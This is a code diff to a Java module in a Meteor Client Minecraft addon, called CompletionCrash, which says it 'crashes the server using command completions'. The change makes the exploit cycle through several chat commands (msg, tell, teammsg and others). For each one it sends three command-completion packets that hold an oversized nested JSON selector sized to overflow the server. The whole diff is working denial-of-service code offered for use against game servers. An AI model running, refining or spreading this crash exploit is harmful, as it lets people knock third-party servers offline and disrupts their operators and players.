@@ -1,6 +1,9 @@
 package widecat.meteorcrashaddon.modules;
 
+import meteordevelopment.meteorclient.events.game.GameLeftEvent;
+import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.systems.modules.Module;
+import meteordevelopment.orbit.EventHandler;
 import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
 import widecat.meteorcrashaddon.CrashAddon;
 
@@ -13,16 +16,54 @@ public class CompletionCrash extends Module {
         super(CrashAddon.CATEGORY, "CompletionCrash", "Crashes the server using command completions, ported from LiquidBounce");
     }
 
+    private final String[] usedCommands = {
+        "msg",
+        "minecraft:msg",
+        "tell",
+        "minecraft:tell",
+        "tm",
+        "teammsg",
+        "minecraft:teammsg",
+        "minecraft:w",
+        "minecraft:me"
+    };
+
+    private int timer = 0;
+    private int currentCommandIndex = 0;
+
     @Override
     public void onActivate() {
-        var overflow = generateJsonObject(2032);
+        timer = 0;
+        currentCommandIndex = 0;
+    }
 
-        var partialCommand = "msg @a[nbt=" + overflow + "]";
+    @EventHandler
+    public void onTick(TickEvent.Pre tickEvent) {
+        timer++;
 
-        for (int i = 0; i < 3; i++) {
-            mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
+        if (timer > currentCommandIndex * 20) {
+            if (currentCommandIndex > usedCommands.length - 1) {
+                toggle();
+                info("Done trying.");
+                return;
+            }
+
+            // send a packet
+            var commandToUse = usedCommands[currentCommandIndex];
+            info("Trying %s...", commandToUse);
+            var overflow = generateJsonObject(2040 - commandToUse.length() - "@a[nbt=]".length());
+            var partialCommand = commandToUse + " @a[nbt=" + overflow + "]";
+
+            for (int j = 0; j < 3; j++) {
+                mc.getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
+            }
+
+            currentCommandIndex++;
         }
+    }
 
+    @EventHandler
+    private void onGameLeft(GameLeftEvent event) {
         toggle();
     }
 
